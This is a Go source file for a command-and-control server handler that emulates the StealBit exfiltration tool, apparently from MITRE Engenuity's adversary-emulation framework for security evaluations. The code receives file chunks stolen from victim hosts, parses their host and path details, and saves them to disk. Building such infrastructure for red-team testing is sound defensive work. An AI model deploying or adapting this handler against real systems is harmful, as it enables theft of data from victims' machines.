package stealbit

import (
    "context"
    "encoding/binary"
    "errors"
    "fmt"
    "net/http"
    "time"
    "io/ioutil"
    "os"
    "path/filepath"
    "strings"
    
    "attackevals.mitre-engenuity.org/control_server/config"
    "attackevals.mitre-engenuity.org/control_server/handlers/base_handler"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_util"
    "attackevals.mitre-engenuity.org/control_server/handlers/handler_manager"
    "attackevals.mitre-engenuity.org/control_server/util"
    
    "github.com/gorilla/mux"
)

const (
    SERVER_ERR_MSG = "Internal server error\n"
    HANDLER_NAME = "stealbit"
    HEARTBEAT_RESPONSE = "8bef61f7-2776-4e55-9ee4-409b6061d6f1"
    MINIMUM_EXFIL_REQ_LEN = 20 // empty data fields except size fields
    EXFIL_CHUNK_RESPONSE = "Ok"
)

type ExfilChunkInfo struct {
    implantID string        // StealBit implant config ID
    domain string           // target domain
    hostname string         // target hostname
    fileAbsPath string      // absolute path of file on target host
    chunkLen int            // file chunk size
    chunkData []byte        // file chunk content
    destDir string          // destination dir for files
    destFileName string     // destination file name
}

type StealbitHandler struct {
    baseHandler *base_handler.BaseHandlerUtil
    wrappedFuncHandles *WrappedFuncHandles
    
    // to be initialized after init()
    server *http.Server
}

type WrappedFuncHandles struct {
    randStringGetter handler_util.RandAlphanumericStringGetter
}

// Factory method for creating a Stealbit C2 handler
func StealbitHandlerFactory(funcHandles *WrappedFuncHandles) *StealbitHandler {
    baseHandler := base_handler.BaseHandlerFactory(HANDLER_NAME)

    return &StealbitHandler{
        baseHandler: baseHandler,
        wrappedFuncHandles: funcHandles,
    }
}

// Creates and adds the example C2 handler to the map of available C2 handlers.
func init() {
    // use production function wrappers
    wrappedFuncHandles := &WrappedFuncHandles{
        randStringGetter: handler_util.GetRandomAlphanumericString,
    }
    handler_manager.RegisterAvailableHandler(StealbitHandlerFactory(wrappedFuncHandles))
}

func (s *StealbitHandler) GetName() string {
    return HANDLER_NAME
}

// StartHandler starts the C2 handler 
func (s *StealbitHandler) StartHandler(restAddress string, configEntry config.HandlerConfigEntry) error {
    // process the information from the configuration entry and use it to initialize the remaining handler variables, if any
    
    // set the bind and REST API addresses for the base handler
    err := s.baseHandler.SetBindAddr(configEntry)
    if err != nil {
        return err
    }
    s.baseHandler.SetRestApiAddr(restAddress)
    s.baseHandler.HandlerLogInfo("Starting %s Handler to listen on %s", s.baseHandler.Name, s.baseHandler.BindAddr)
    
    // initialize URL router
    urlRouter := mux.NewRouter()

    // bind HTTP routes to their functions - these functions will handle things like fetching tasks and files, uploading task results and files
    urlRouter.HandleFunc("/bs/portal", s.HandleHeartbeat).Methods("GET")
    urlRouter.HandleFunc("/{hash}", s.HandleExfilChunkRequest).Methods("PUT")
    
    s.server = &http.Server{
        Addr:         s.baseHandler.BindAddr,
        WriteTimeout: time.Second * 15,
        ReadTimeout:  time.Second * 15,
        IdleTimeout:  time.Second * 60,
        Handler:      urlRouter,
    }
    
    // start handler in goroutine so it doesn't block
    go func() {
        err := s.server.ListenAndServe()
        if err != nil && err.Error() != "http: Server closed" {
            s.baseHandler.HandlerLogError(err.Error())
        }
    }()
    
    return nil
}

// StopHandler stops the C2 handler
func (s *StealbitHandler) StopHandler() error {
    s.baseHandler.HandlerLogInfo("Stopping %s Handler", s.baseHandler.Name)
    emptyContext := context.Background()
    return s.server.Shutdown(emptyContext)
}

// Handle GET requests for current implant task
func (s *StealbitHandler) HandleHeartbeat(w http.ResponseWriter, r *http.Request) {
    // Send heartbeat response
    s.baseHandler.HandlerLogDebug("Received heartbeat. Sending heartbeat response")
    w.Write([]byte(HEARTBEAT_RESPONSE))
}

func buildExfilChunkInfo(data []byte, info *ExfilChunkInfo) error {
    dataLen := len(data)
    if dataLen < MINIMUM_EXFIL_REQ_LEN {
        return errors.New(fmt.Sprintf("Exfil chunk request info size of %d does not meet minimum length requirement.", dataLen))
    }
    index := 0

    // Parse implant config ID string
    configLen := int(binary.BigEndian.Uint32(data[index:index+4]))
    index = index + 4
    configStr := ""
    if (configLen > 0) {
        if index + configLen > dataLen {
            return errors.New("Exfil chunk request config string goes out of bounds.")
        }
        configStr = string(data[index:index+configLen])
    }
    index = index + configLen

    // Parse target domain string
    if index + 4 > dataLen {
        return errors.New("Exfil chunk request data does not contain domain length.")
    }
    domainLen := int(binary.BigEndian.Uint32(data[index:index+4]))
    index = index + 4
    domainStr := ""
    if (domainLen > 0) {
        if index + domainLen > dataLen {
            return errors.New("Exfil chunk request domain string goes out of bounds.")
        }
        domainStr = string(data[index:index+domainLen])
    }
    index = index + domainLen

    // Parse target hostname string
    if index + 4 > dataLen {
        return errors.New("Exfil chunk request data does not contain hostname length.")
    }
    hostnameLen := int(binary.BigEndian.Uint32(data[index:index+4]))
    index = index + 4
    hostnameStr := ""
    if (hostnameLen > 0) {
        if index + hostnameLen > dataLen {
            return errors.New("Exfil chunk request hostname string goes out of bounds.")
        }
        hostnameStr = string(data[index:index+hostnameLen])
    }
    index = index + hostnameLen

    // Parse file path string
    if index + 4 > dataLen {
        return errors.New("Exfil chunk request data does not contain file path length.")
    }
    filePathLen := int(binary.BigEndian.Uint32(data[index:index+4]))
    index = index + 4
    filePathStr := ""
    if (filePathLen > 0) {
        if index + filePathLen > dataLen {
            return errors.New("Exfil chunk request file path string goes out of bounds.")
        }
        filePathStr = string(data[index:index+filePathLen])
    }
    index = index + filePathLen

    // Grab file content
    if index + 4 > dataLen {
        return errors.New("Exfil chunk request data does not contain file content length.")
    }
    contentLen := int(binary.BigEndian.Uint32(data[index:index+4]))
    index = index + 4
    var content []byte
    if (contentLen > 0) {
        if index + contentLen > dataLen {
            return errors.New("Exfil chunk request content goes out of bounds.")
        }
        content = data[index:]
        if len(content) != contentLen {
            return errors.New(fmt.Sprintf("Expected chunk content size of %d, parsed %d.", contentLen, len(content)))
        }
    }

    // Fill out struct fields
    info.implantID = configStr
    info.domain = domainStr
    info.hostname = hostnameStr
    info.fileAbsPath = filePathStr
    info.chunkLen = contentLen
    info.chunkData = content
    info.destDir = fmt.Sprintf("%s-%s-%s", info.implantID, info.domain, info.hostname)
    info.destFileName = convertTargetFilePathToDestPath(info.fileAbsPath)
    return nil
}

func convertTargetFilePathToDestPath(path string) string {
    newPath := strings.ReplaceAll(path, ":", "_")
    newPath = strings.ReplaceAll(newPath, "/", "_")
    return strings.ReplaceAll(newPath, "\\", "_")
}

func (s *StealbitHandler) logExfilChunkInfo(info *ExfilChunkInfo) {
    s.baseHandler.HandlerLogDebug(
        "Received exfil chunk request from %s\\%s (Stealbit ID %s) for file %s, chunk size %d",
        info.domain,
        info.hostname,
        info.implantID,
        info.fileAbsPath,
        info.chunkLen,
    )
}

func appendToDestFile(filePath string, data []byte) error {
    f, err := os.OpenFile(filePath, os.O_APPEND | os.O_CREATE | os.O_WRONLY, 0644)
    if err != nil {
        return err
    }
    if _, err = f.Write(data); err != nil {
        f.Close()
        return err
    }
    return f.Close();
}

// Handle exfil chunk PUT request
func (s *StealbitHandler) HandleExfilChunkRequest(w http.ResponseWriter, r *http.Request) {
    vars := mux.Vars(r)

    hash, ok := vars["hash"]
    if !ok {
        s.baseHandler.HandlerLogError("Hash not included in PUT request to /{hash}")
        w.WriteHeader(http.StatusNotFound)
        return
    }
    s.baseHandler.HandlerLogDebug("Received exfil chunk PUT request for file hash %s", hash)

    data, err := ioutil.ReadAll(r.Body)
    if err != nil {
        s.baseHandler.HandlerLogError("Failed to read PUT request data: %s", err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    // Get request information
    var chunkInfo ExfilChunkInfo
    if err = buildExfilChunkInfo(data, &chunkInfo); err != nil {
        s.baseHandler.HandlerLogError("Failed to parse PUT request data: %s", err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }

    s.logExfilChunkInfo(&chunkInfo)

    // Create dest directories if needed
    fullDestDir := filepath.Join(util.UploadDir, chunkInfo.destDir)
    if err = os.MkdirAll(fullDestDir, 0777); err != nil {
        s.baseHandler.HandlerLogError("Failed to create destination directory %s for request: %s", fullDestDir, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }
    fullDestPath := filepath.Join(fullDestDir,  chunkInfo.destFileName)
    s.baseHandler.HandlerLogDebug("Saving file chunk data to %s", fullDestPath)

    // Append to dest file
    if err = appendToDestFile(fullDestPath, chunkInfo.chunkData); err != nil {
        s.baseHandler.HandlerLogError("Failed to append to destination file %s for request: %s", fullDestPath, err.Error())
        w.WriteHeader(http.StatusInternalServerError)
        w.Write([]byte(SERVER_ERR_MSG))
        return
    }
    w.Write([]byte(EXFIL_CHUNK_RESPONSE))
}

